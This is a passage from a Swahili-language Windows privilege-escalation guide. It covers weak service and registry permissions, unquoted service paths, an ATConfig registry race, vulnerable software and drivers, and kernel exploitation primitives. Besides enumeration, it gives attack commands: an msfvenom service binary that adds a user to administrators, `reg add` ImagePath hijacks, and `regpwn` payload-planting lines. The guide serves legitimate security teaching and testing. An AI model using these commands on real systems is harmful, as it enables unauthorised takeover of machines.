- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa ajili ya kugundua na kutumia udhaifu huu, unaweza kutumia _exploit/windows/local/service_permissions_.

### Ruhusa dhaifu za binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye marupurupu, lakini **watumiaji wenye marupurupu ya chini wanaweza kurekebisha EXE ya service au folda yake kuu**, mara nyingi service inaweza kutekwa nyara kwa **kubadilisha binary na kuwasha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ambako binary hiyo iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata binary zote zinazoendeshwa na service ukitumia **wmic** (si katika system32) na kuangalia ruhusa zako ukitumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizopewa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya service au kwenye directory inayoihifadhi. Mchakato wa kawaida wa kutumia udhaifu huu ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na njia ya executable kwa `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa `icacls <path>`.
3. Badilisha binary ya service na payload au binary halali ya service yenye madhara.
4. Anzisha upya service kwa `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa mfumo / trigger ya service).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa service hairuhusu mtumiaji wa kawaida kuiwasha upya, angalia ikiwa inaanza kiotomatiki wakati wa kuwasha kompyuta, ina failure action inayoizindua tena, au inaweza kuanzishwa kwa njia isiyo ya moja kwa moja na application inayoitumia.

### Ruhusa za kurekebisha registry za services

Unapaswa kuangalia ikiwa unaweza kurekebisha registry yoyote ya service.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya service kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Jaribio la ruhusa la awali lilielezwa kama ifuatavyo:

Inapaswa kuangaliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** zina ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Kagua ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** zina ruhusa za registry key husika zinazowezesha kuandika. Ingizo la ACL pekee halithibitishi ufikiaji halisi: ingizo za deny, token ya sasa, na ruhusa zilizorithiwa ni muhimu. Haki za registry key ni tofauti na haki za `SERVICE_CHANGE_CONFIG` na `SERVICE_START` za service object. Escalation pia inahitaji sehemu inayoweza kutumika ya usanidi wa service, njia ya kuanzisha service, na utambulisho wa service wenye ruhusa za juu zaidi. Tazama [haki za registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [marejeleo ya haki za ufikiaji wa service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) za Microsoft.

Ili kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Mbio ya symlink ya registry kwa uandishi wa thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenye ufunguo wa session wa HKLM. Mbio ya **symbolic link** ya registry inaweza kuelekeza uandishi huo wenye upendeleo hadi kwenye njia yoyote ya HKLM, na kutoa uwezo wa kuandika thamani yoyote ya HKLM.<sup>[[18]](#references)</sup>

Maeneo ya funguo (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya Accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure desktop na mtumiaji anaweza kuiandikia.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Weka thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha kunakili kwa secure desktop (k.m., **LockWorkstation**), kunakoanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapoanzishwa, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye lengwa la HKLM lililolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyoelekezwa.

Ukishapata uwezo wa kuandika thamani yoyote ya HKLM, tumia hilo kwa LPE kwa kubadilisha thamani za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/mstari wa amri)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuanzisha (k.m., **`msiserver`**) kisha uanzishe baada ya kuandika. **Dokezo:** utekelezaji wa public exploit **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Ruhusa za AppendData/AddSubdirectory kwenye registry ya huduma

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registry kutoka kwenye hii**. Kwa huduma za Windows, hii **inatosha kutekeleza msimbo wowote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa njia ya executable haijawekwa ndani ya alama za nukuu, Windows itajaribu kutekeleza kila sehemu inayoishia kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma ambazo hazijawekwa ndani ya alama za kunukuu, ukiondoa zile zinazohusiana na huduma za Windows zilizojengewa ndani:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda mwenyewe binary ya service kwa metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha vitendo vya kutekelezwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, huenda ikawezekana kufanya privilege escalation. Maelezo zaidi yanapatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Malengo ya script za scheduled task

Kwa task iliyowezeshwa na inayotumia `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **hoja za action** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa hoja ya faili iliyobainishwa moja kwa moja ya interpreter, kama vile PowerShell `-File`. Ikiwa faili ya batch ya scheduled task ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script iliyorejelewa; vigeu, masharti na uunganishaji wa amri kwenye shell vinahitaji kufuatiliwa mwenyewe. Script au saraka mama ambayo caller anaweza kuandikia ni dalili ya uwezekano wa utekelezaji kati ya akaunti tu ikiwa principal iliyosanidiwa ya task ni tofauti na caller na task inafikia action hiyo. ACL inayoruhusu kuongeza tu maudhui inaweza kuwa muhimu kwa script, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), saraka ya kufanya kazi, kichochezi na sera ya udhibiti wa programu kabla ya kudai kuwa privilege escalation inawezekana. Orodhesha vitu bila kubadilisha script au kuanzisha task.

## Named streams kwenye faili zinazoweza kufikiwa

Kwenye NTFS, faili inayoweza kusomwa inaweza kuwa na named `:$DATA` stream ambayo maudhui yake hayaonyeshwi kwenye uorodheshaji wa kawaida wa saraka. Kwa seti ndogo na husika ya faili za chelezo au usanidi zinazoweza kufikiwa, kagua **majina na ukubwa** wa stream kabla ya kufungua maudhui yake; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwa kuna siri ni dalili tu. Kagua ruhusa halisi ya kusoma faili, usaidizi wa filesystem kwa stream, iwapo stream ina credentials zinazoweza kutumika, na akaunti ambazo credentials hizo huingia nazo. Epuka kuchanganua stream kwenye saraka zote kwa kujirudia na kuchapisha maudhui ya stream wakati wa uorodheshaji wa kawaida.

## Ingizo za helper za Windows Driver Kit zinazoendeshwa na scheduled task

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf` na `working\rsf.rsf` ya mradi kutoka kwenye saraka yake ya uendeshaji. Scheduled task au huduma inayoanzisha helper hii kwa akaunti yenye mamlaka ya juu inaweza kutumia ruhusa za kuandika za mtumiaji mwenye mamlaka ya chini kwenye ingizo hizo kutekeleza amri katika muktadha wa akaunti hiyo, hata kama executable ya helper yenyewe imelindwa. Thibitisha kuwa consumer ina mamlaka ya juu na kwamba **faili zote mbili** za sidecar zinaweza kuundwa au kurekebishwa; kuipata helper pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia za faili hizo mbili za sidecar. Ikiwa task haibainishi saraka ya kufanya kazi, saraka ya executable ni dalili tu inayohitaji kuthibitishwa, si uthibitisho wa mahali task inaposoma ingizo zake. Sharti la faili ya project working pia lazima litimizwe. Kagua principal halisi ya task badala ya kudhani kuwa inaendeshwa kama SYSTEM.

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha mojawapo na kuongeza mamlaka) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya ukarabati wa Windows agent ya Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri Windows agents za zamani za Checkmk ambazo ziliandika command files katika `C:\Windows\Temp` kisha kutekeleza faili iliyokuwepo na iliyolindwa dhidi ya uandishi baada ya kushindwa kuibadilisha. Vendor alirekebisha tatizo hili katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na ikiwa operesheni ya agent iliyoathiriwa inaweza kutekelezwa; lebo ya branch pekee kama `2.1` haiwezi kuthibitisha uwepo wa hatari. Enumeration inaweza kukagua version, hali ya service, na ruhusa za Temp bila kuunda faili au kuanzisha agent commands.

#### Ukaguzi wa SAML service ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri ADSelfService Plus build 6210 na matoleo ya awali; vendor aliirekebisha katika build 6211. Inahusika tu ikiwa SAML SSO **imewezeshwa au iliwahi kuwezeshwa**. Kwa hiyo, ingizo la bidhaa iliyosakinishwa au service path ni kidokezo cha kufuatilia, si uthibitisho wa uwepo wa vulnerability: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na account inayoendesha service hiyo. Code execution kupitia service hutumia privileges za account hiyo; utekelezaji wa SYSTEM huhitaji instance inayoendeshwa kama SYSTEM. Faili ya `OfflineBackup_*.ezip` inayosomeka katika saraka ya Backup ya bidhaa ni kidokezo tofauti cha backup iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumiwa au dosari hii ya SAML. Rekodi path yake na access rights bila kuifungua wakati wa routine enumeration.

#### Mipaka ya Jenkins controller na domain account

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuianzisha: [Jenkins inaeleza kuwa hizi ni ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inatekelezwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaifikia katika scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi credential material na encryption keys katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **ruhusa ya kusoma faili zinazohitajika** na njia tofauti ya kutumia tena account bila kuchapisha secrets katika matokeo yanayoshirikiwa. Ikiwa account hiyo ina ruhusa ya kuandika `scriptPath` ya AD user object, thibitisha kuwa script path inaweza kuandikwa na kwamba kuna logon halisi au scheduled consumer inayoiendesha kama target user kabla ya kuichukulia kama utekelezaji kati ya watumiaji. Udhibiti zaidi wa group unahitaji kuthibitisha kando effective AD rights.

#### Utambulisho wa Azure Pipelines self-hosted agent

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuianzisha** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa account yenye privileges za chini inaweza kuwasilisha script step na kuendesha pipeline hiyo kwenye Windows agent inayojisimamia, step hutekelezwa kama [account ya operating system iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vikwazo vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa agent service kabla ya kudai mabadiliko ya utambulisho wa mtumiaji mwingine au SYSTEM. Agent iliyosakinishwa, project role, au ruhusa ya kuandika repository pekee ni kidokezo tu; kagua permissions na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft hutofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account**, inayoendesha synchronization service na kufikia SQL database yake, na **AD DS connector account**, ambayo ruhusa zake za directory hutegemea vipengele vya sync vilivyosaniwa. Connector credentials huhifadhiwa zikiwa zimesimbwa katika database hiyo, huku key material [ikilindwa na DPAPI chini ya ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group yenye jina linalodokeza kuwa ni local administrator, au uwezo wa kuona database pekee havithibitishi credential inayoweza kufumbuliwa au kupandisha privileges za domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa, na effective AD privileges za utambulisho huo. Routine enumeration inapaswa kuonyesha metadata ya service na access pekee, si kuuliza au kuchapisha secrets zilizohifadhiwa.

#### Ruhusa za Printer driver support DLL

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs chini ya `C:\ProgramData` na kuzipakia katika print process yenye privileges za juu zaidi. Kagua saraka halisi ya driver na ACL za DLL, pamoja na saraka za parent na reparse points, hata ikiwa printer WMI enumeration imekataliwa. Kuhusu [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), path iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza upakiaji wa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu kuandika ni kidokezo tu: thibitisha ruhusa halisi ya kuandika baada ya kuzingatia deny entries, kwamba driver husika imesakinishwa na inapakia faili hiyo chini ya utambulisho wenye privileges za juu, na ikiwa driver iliyosasishwa ya vendor au security program imerekebisha usakinishaji huo. Usihitimishe kuwa kuna vulnerability kutokana na jina la saraka au version ya driver pekee.

### Ruhusa za Kuandika

Kagua kama unaweza kurekebisha config file ili kusoma faili maalum, au kama unaweza kurekebisha binary itakayoendeshwa na account ya Administrator (schedtasks).

Njia moja ya kutafuta ruhusa dhaifu kwenye folders/files za mfumo ni kufanya hivi:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo chini ya folda zake za `plugins`. Ikiwa kuna usakinishaji wa portable/copy unaoweza kuandikwa, kuweka plugin hasidi husababisha code execution kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kutoka `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Kuendesha wakati wa kuanzisha mfumo

**Angalia kama unaweza kubatilisha registry au binary yoyote itakayoendeshwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu **maeneo ya autoruns yanayoweza kutumika kuongeza privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazoweza kuwa **za wahusika wengine na za ajabu/zilizo hatarini**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inafichua primitive ya arbitrary kernel read/write (jambo la kawaida katika IOCTL handler zilizoundwa vibaya), unaweza kufanya privilege escalation kwa kuiba SYSTEM token moja kwa moja kutoka kwenye kernel memory.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Nyenzo zinazohusiana na Windows kernel-exploitation:

Kwa hali ya kernel-mode ring-buffer yenye read/write registers zinazoweza kuandikwa na mtumiaji, tazama [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa race-condition bugs ambapo call iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambuliaji, kupunguza kasi ya lookup kwa makusudi (kwa kutumia components zenye urefu wa juu au mnyororo wa directories wenye kina) kunaweza kurefusha dirisha kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, na I/O ring pivots

Baadhi ya Windows kernel LPE chains zinaweza kujengwa kutokana na bugs mbili ambazo kila moja ni dhaifu kivyake: **cancel-safe queue lifetime race** inayofungua request/CBD wakati queue lock bado imeshikiliwa, na **lock-release-before-copy** disclosure inayovujisha paged-pool allocation iliyofunguliwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na exploitation:

- **Free-under-lock + cancel afterwards**: tafuta success path inayofanya **Acquire -> CompleteRequest/free -> Release**, huku cancel path ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa success path inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia CBDQ/CSQ lock, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofunguliwa kwa callback ya remove ya driver.
- **Reclaim the freed queue object** kwa paged-pool allocation ya ukubwa sawa inayodhibitiwa na mshambuliaji. `NPFS` Data Queue Entries zinafaa kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na baadaye unaweza kuvichunguza kwa pipe read/peek operations. Ikiwa object iliyofunguliwa ina list links, ziandike upya ziwe **cyclic list of fake request nodes in user memory** ili driver ichakate mara kwa mara request structures zinazofafanuliwa na mshambuliaji badala ya kusimama kwenye list head ya awali.
- **Upgrade a predictable write**: ikiwa fake request inaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata kernel write inayodhibitiwa kwa **address lakini si kwa value**. Katika hali hiyo, lenga sehemu ya **length/size** ya sprayed pool object badala ya pointer ya mwisho ya code/data, kisha pitia spray hadi object iliyoharibiwa ikupe **out-of-bounds paged-pool read**.
- **Raceable disclosure pattern**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka mshambuliaji anapoweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano, kwa kuongeza list/resource entries nyingi zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi hupanua dirisha la replacement bila lazima kuangusha mashine.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays ni disclosure targets bora kwa sababu ukubwa wake wa paged-pool unaweza kudhibitiwa na mshambuliaji (`8 * regBufferCnt`), na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Leak mojawapo ya arrays hizi, pata `IORING_OBJECT` inayoizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili operations zinazofuata za I/O ring zitumie entries zilizoghushiwa na mshambuliaji na kutoa arbitrary kernel read/write. Ikiwa write pekee inayopatikana inakupa byte thabiti (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kujenga user pointer yenye byte inayojirudia kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, kisha weka forged registered-buffer array hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Baada ya kupata arbitrary kernel read/write kutoka kwa I/O ring iliyoharibika, iba token ya SYSTEM kwa kutumia workflow ya kawaida ya baada ya primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption za Registry hive

Vulnerabilities za kisasa za hive hukuwezesha kupanga layouts za deterministic, kutumia descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha corruption ya metadata kuwa overflows za kernel paged-pool bila driver maalum. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ya direct-mode ya `RtlQueryRegistryValues` kutoka kwa paths zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hukubali registry path kutoka userland, huthibitisha tu kwamba ni UTF-16 string halali, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa `RTL_QUERY_REGISTRY_DIRECT` kuelekeza matokeo kwenye scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hufasiriwa kulingana na aina **halisi** ya registry, si aina ambayo developer alitarajia.

Hii huunda primitives mbili muhimu:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path ya absolute `\Registry\...` inayodhibitiwa na mtumiaji huiruhusu driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kama zipo kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kufikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` inaweza kusababisha type confusion na kutafsiriwa kama `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea aina ya registry value.

Vidokezo vya vitendo vya exploitation:

- **Mitigation ya Windows 8+**: query ikigusa **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploitability iendelee, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya system hives zinazoaminika** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikwa za `\Registry\Machine`, kisha rudia scan kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazoweza kufikiwa kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: write ya moja kwa moja ya baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na inaweza kufuta kwa sehemu callback/function pointer iliyo karibu.
